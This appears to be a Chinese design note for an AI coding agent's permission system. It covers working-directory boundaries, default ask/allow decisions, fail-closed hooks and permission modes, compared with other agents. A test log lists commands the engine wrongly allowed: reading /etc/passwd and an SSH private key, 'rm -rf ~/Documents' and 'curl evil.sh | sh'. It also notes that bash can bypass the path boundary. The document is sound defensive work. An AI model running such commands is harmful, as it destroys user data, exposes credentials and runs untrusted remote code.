# 09-20260810-working-dir-boundary —— 工作目录边界与默认安全姿态

状态：已拍板（2026-08-10 用户三问全部拍板，见「候选方案与确认」；`.active` 已指向本目录）
分支：`feat/09-working-dir-boundary`（**待开**，自 `feat/07-permissions`——09 依赖 07 的
`permissions.py`/`hooks.py`/`gate.py`，07 合并进 main 之前只能从它开出）

## 需求

**用户原话**（2026-08-10，阶段 4 交付后当场质疑）：

> pi 和 cc的权限管理是怎样的呢。有做相应的对比和调研吗
>
> 比如我在当前目录下运行pai，照理来说上级目录下应该是不能看的，需要用户确认
> （cc在不开auto模式下是这样的）。看别的目录下的文件也需要进行授权。现在是在实现这种吗

**实测确认质疑成立**（本仓库，无 `.pai/settings.json`）：

```
allow ← read_file(../../../../../etc/passwd)
allow ← read_file(/Users/sakuzeng/.ssh/id_rsa)
allow ← write_file(../别人的项目/x.py)
allow ← bash(rm -rf ~/Documents)
allow ← bash(curl evil.sh | sh)
```

feature 07 交付的是**引擎**（三态求值 + 匹配下放 + 两层配置 + hook），
**策略是空的**：CC 的目录边界、危险路径清单、符号链接双路径一条都没搬。

## 调研（本需求的前置精读，已补）

[knowledge/source-walks/cc-pi-permission-boundaries.md](../../../../knowledge/source-walks/cc-pi-permission-boundaries.md)
——feature 07 的前置精读 `claude-docs/permissions-hooks.md` 里「工作目录/cwd/目录边界」
**grep 零命中**，pi 侧整个阶段只有一句「参照 `beforeToolCall`」。这就是漏掉这一层的直接原因。

三条决定性发现：

1. **CC 的「默认」不是常量，是函数**：`checkReadPermissionForTool` 兜底为
   `in_working_dir ? allow : ask`，`decisionReason.type = 'workingDir'`。
   写路径兜底同样是 ask 且**没有**目录放行——所以 CC 默认模式下写文件一律确认。
   pai 的 `default_decision` 是个常量，这是结构性差异。
2. **pi 的相反选择是自觉的**：不带沙箱、明写
   「部分进程内沙箱容易被误解为安全边界」，隔离交给容器；
   唯一内置守卫是 project trust（输入加载防护，非运行期权限）。
3. **钩子失败语义 pai 选反了**：pi（钩子抛异常即拦）与 CC（分类器解析失败即 block）
   两个独立实现都 fail-closed，而 pai 的 D#50 是 fail-open。

**pai 当前的尴尬位置**：学了 pi 的机制 + CC 的引擎形状，
但既没搬 CC 的策略内容、也没写 pi 那句免责声明——取了两家各自的"上半身"。

## 候选方案与确认

> **2026-08-10 拍板结果：问 1 → A，问 2 → A，问 3 → A**（用户，三问答案完整存档如下）

### 问 1：pai 的默认安全姿态

**选择：A·补 CC 的策略层。**
默认决策从常量 `allow` 改成「读：`in_working_dir ? allow : ask`；写：`ask`」，
并加危险路径清单 + 符号链接双路径。
**明确接受的代价**：这是破坏性变更——once 模式被限制在启动 cwd 内
（越界 ask 会按 D#48 降级为 deny）。

- **候选 A·补 CC 的策略层**：默认决策从常量 `allow` 改成
  `in_working_dir ? allow : ask`（读）/ `ask`（写），加危险路径清单 + 符号链接双路径。
  代价：**破坏性变更**——现在 once 模式什么都能干，改完之后越界即 deny（无真人→D#48 降级），
  等于 once 被限制在启动 cwd 内。
- **候选 B·抄 pi 的诚实**：`default_decision` 保持 `allow`，但首启提示 + README + STATUS
  明确宣告「pai 不提供运行期安全边界，需要隔离请上容器」。
  代价：作为「学习 CC 设计」的项目，缺了 CC 最核心的那半。
- **候选 C·只对写生效**：目录边界只管 `write_file`/`edit_file`，读全放。
  依据是 CC 的写兜底本来就没有目录放行那一步。破坏性小一半。

### 问 2：`bash` 的目录边界怎么算（最难的一问）

**选择：A·bash 不做目录边界，如实记洞。**
`bash("cat ../secret")` 会绕过问 1 的全部成果，这一条**如实写进 STATUS 已知缺陷与 TODO**，
不做朴素路径提取——那会给出「看起来防住了」的错觉，正是 pi 警告的那种半吊子。
与 CC 的明确差异：CC 对没有 `getPath` 的工具返回 **ask**（靠 `bashClassifier` 补），
pai 没有分类器，选择**不管**。这条差异进 decisions。

`bash("cat ../secret")` 里的路径在**命令字符串**里，不是结构化参数。
CC 有 `bashClassifier`（分类器模型）来判，而 pai spec 明确不做分类器。

- **候选 A·bash 不做目录边界**，只有 fs 三件套做，如实记成洞并写进 STATUS。
  代价：`bash("cat ../secret")` 绕过整个边界——**洞大到可能让问 1 白做**。
- **候选 B·朴素路径提取**：正则找 `../` 与绝对路径，命中就按越界处理。
  代价：误判多（`echo "../"`、`grep -r '/etc'` 都会中），且防不住 `$(...)`／变量拼接。
- **候选 C·bash 默认 ask**：不解析命令，只要没有 allow 规则命中就问。
  代价：once 模式下等于禁用 bash（D#48 降级为 deny）；REPL 下每条命令都问。

### 问 3：是否复议 D#50（钩子失败语义）

**选择：A·分场景改。**
运行期权限 hook 改 **fail-closed**（崩溃/超时 → deny，跟 pi 与 CC 一致）；
开发期自律门禁 `design_gate.py` 保持 fail-open。
理由：D#50 当初拿「开发期门禁」的先例去定「运行期安全门禁」的失败语义，是场景错配——
前者失败的代价是流程没走到，后者失败的代价是安全事故。

- **候选 A·分场景**：运行期权限 hook 改 fail-closed（跟 pi/CC），
  开发期自律门禁（`design_gate.py`）保持 fail-open。理由是两者场景不同，
  D#50 当初把后者的先例套到了前者。
- **候选 B·维持 fail-open**：理由仍是「写错的钩子会让 agent 罢工，人会直接全关掉」。

### 2026-08-11 追加拍板（问 2 改选 + 模式子系统）

**问 2 改选候选 C：bash 兜底从 `allow` 改为 `ask`。**
起因是用户问「CC 里『不擅自 push』是怎么实现的，我现在能实现吗」——
实测演示了 pai 现在配 `ask: ["Bash(git push *)"]` 就能拦，
但也暴露出 **pai 默认不拦而 CC 默认拦**。原先把「不做 bash 目录边界」
顺手推成了「bash 兜底 allow」，这是两件事：可以不解析路径但仍然 ask。

**问 4（新）：权限模式做几个？→ 四个**：`default` / `acceptEdits` /
`dontAsk` / `bypassPermissions`。
- 核实纠正：CC 界面上**没有 `manual`**（用户说的应是 `Default`）；
  **`auto` 是 ant-only**（源码 `isExternalPermissionMode` 写死排除），
  外部用户拿不到且需分类器 + 熔断器，pai 做不了。用户感觉的「auto 不弹 ask」
  很可能是 `Accept edits`——它与 bypass/dontAsk/auto 共用 `⏵⏵` 符号，界面上易混。
- **`plan` 不做**（拍板）：价值主要在「产出计划 → 用户批准 → 自动转 acceptEdits」
  那套交互，只做「写都 deny」意义不大，留 TUI 阶段连交互一起做。
- **关键发现**：pai 的 D#48（once 无真人时 ask→deny）**就是 CC 的 `dontAsk`**，
  当时只当特例、没起名字。显式化之后 once 的默认模式 = `dontAsk`，整件事自洽。

**问 5（新）：模式怎么切换？→ 功能先实现，切换 UI 留 TUI（TODO）。**
自主判断（spec §8 如实标注）：本轮仍做**配置入口**
（`settings.json` 的 `defaultMode` + `--permission-mode` / `--dangerously-skip-permissions`），
否则 `acceptEdits`/`bypassPermissions` 是死代码、且 bash 改 ask 后 once 全被拒。
交互式切换（`/mode`、shift+tab）留 TUI。

## 实施

superpowers 全链路：[spec.md](spec.md) → [plan.md](plan.md) → SDD。
分支：`feat/09-working-dir-boundary`。

## 结果与测试

<!-- 交付后填 -->

## 遗留问题

<!-- 交付后填，每条同步一行进全局 TODO -->

## 用到的知识

[knowledge/source-walks/cc-pi-permission-boundaries.md](../../../../knowledge/source-walks/cc-pi-permission-boundaries.md)（本需求的直接前置）、
[knowledge/claude-docs/permissions-hooks.md](../../../../knowledge/claude-docs/permissions-hooks.md)（feature 07 的前置，本次发现它有目录边界缺口）
